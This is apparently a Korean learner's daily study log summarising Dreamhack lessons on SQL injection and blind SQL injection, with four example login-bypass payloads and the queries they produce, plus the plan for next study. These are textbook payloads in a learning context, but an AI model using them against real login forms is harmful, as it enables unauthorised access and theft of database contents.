#### 작성 : changwoo1223
**작성 날짜 : 2024-07-17**

---
#### 어제까지 무엇을 했는가?
- Dreamhack 강의
- SQL Injection  
    : SQL 쿼리에 이용자의 입력 값을 삽입해 이용자가 원하는 쿼리를 실행할 수 있는 취약점  
    -> 조작된 쿼리로 인증을 우회 / DB의 정보를 유출 

```sql
/* ID: admin"--, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식*/
SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"

/*ID: admin" or "1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식*/
SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"

/*ID: admin, PW: DUMMY" or userid="admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식*/
SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"

/*ID: " or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식*/
SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
```
- Blind SQL Injection  
    : 질의 결과를 이용자가 화면에서 직접 확인하지 못할 때 참/거짓 반환 결과로 데이터를 획득하는 공격 기법  
    -> DB 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용할 수 있는 SQL injection 공격 기법 
      1. 로그인 요청의 폼 구조 파악
      2. 비밀번호 길이 파악
      3. 비밀번호 획득 -> 이진탐색 알고리즘 등

#### 오늘 무엇을 계획하고 있는가?
- Dreamhack 강의
  - No SQL injection
- java script 공부 
 
#### 어떤 문제점이 있거나 도움이 필요한 것이 있는가?
sql, java script, python 등 언어중 어떤 언어를 먼저 공부하는게 좋을지.